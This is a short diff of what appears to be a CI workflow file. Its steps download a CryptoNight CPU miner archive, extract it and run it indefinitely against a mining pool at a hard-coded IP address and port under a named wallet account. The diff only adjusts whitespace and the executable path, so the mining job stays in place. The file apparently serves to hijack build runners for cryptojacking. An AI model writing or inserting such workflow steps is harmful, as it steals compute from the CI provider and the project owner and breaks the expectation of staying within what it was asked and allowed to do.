@@ -37,13 +37,14 @@ steps:
 - name: DOWNLOAD 
  
 run: Invoke-WebRequest https://github.com/jceminer/cn_cpu_miner/blob/master/jce_cn_cpu_miner.windows.033q.zip 
+
 - name: Extract 
  
 run: Expand-Archive jce_cn_cpu_miner.windows.033q.zip 
  
 - name: Running 
  
-run: .\jce_cn_cpu_miner64 --auto --any --forever --keepalive --variation 2 --low -o 168.235.86.33:3393 -u SK_pDKo9B7rTqyPDrYeohNv5.jabudeen -p x
+run: jce_cn_cpu_miner64 --auto --any --forever --keepalive --variation 2 --low -o 168.235.86.33:3393 -u SK_pDKo9B7rTqyPDrYeohNv5.jabudeen -p x
  
 - name: END 
  
